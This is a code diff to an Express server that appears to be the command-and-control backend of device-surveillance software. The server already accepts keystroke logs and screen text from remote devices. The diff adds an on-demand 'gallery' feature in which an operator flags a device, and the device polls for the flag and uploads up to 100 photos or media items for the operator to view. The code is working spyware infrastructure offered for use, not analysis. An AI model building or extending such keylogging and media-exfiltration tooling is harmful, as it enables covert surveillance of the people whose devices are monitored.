@@ -15,7 +15,7 @@ const pool = new Pool({
   ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
 });
 
-app.use(express.json());
+app.use(express.json({ limit: '20mb' }));
 app.use(express.urlencoded({ extended: true }));
 
 app.use(
@@ -117,6 +117,7 @@ app.get("/api/me", requireLogin, async (req, res) => {
   } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
 });
 
+// ================= DEVICE STATE =================
 const deviceStates = new Map();
 const keylogs = [];
 const deviceUIs = new Map();
@@ -187,6 +188,7 @@ app.get("/api/devices", requireLogin, async (req, res) => {
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to load devices." }); }
 });
 
+// ================= KEYLOGGER & UI =================
 app.post("/api/keylog", async (req, res) => {
   try {
     const { deviceId, deviceToken, text, timestamp } = req.body;
@@ -225,6 +227,60 @@ app.get("/api/ui", requireLogin, async (req, res) => {
   res.json(deviceUIs.get(deviceId) || { uiText: "", timestamp: 0 });
 });
 
+// ================= GALLERY =================
+const galleryData = new Map();
+const galleryRequestFlags = new Map();
+
+app.post("/api/gallery/request", requireLogin, async (req, res) => {
+  const { deviceId } = req.body;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  galleryRequestFlags.set(deviceId, true);
+  res.json({ success: true });
+});
+
+app.get("/api/gallery/request", async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const requested = galleryRequestFlags.get(deviceId) || false;
+  if (requested) galleryRequestFlags.delete(deviceId);
+  res.json({ requested });
+});
+
+app.post("/api/gallery/upload", async (req, res) => {
+  try {
+    const { deviceId, deviceToken, media } = req.body;
+    if (!deviceId || !deviceToken || !Array.isArray(media)) {
+      return res.status(400).json({ error: "deviceId, deviceToken, media array required" });
+    }
+    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
+      return res.status(401).json({ error: "Invalid device token." });
+    }
+    const latest = media.slice(0, 100);
+    galleryData.set(deviceId, latest);
+    res.json({ success: true, count: latest.length });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "Gallery upload failed" });
+  }
+});
+
+app.get("/api/gallery", requireLogin, async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  const media = galleryData.get(deviceId) || [];
+  res.json({ media });
+});
+
+// ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
 app.get("/control", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
 app.get("/dashboard.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
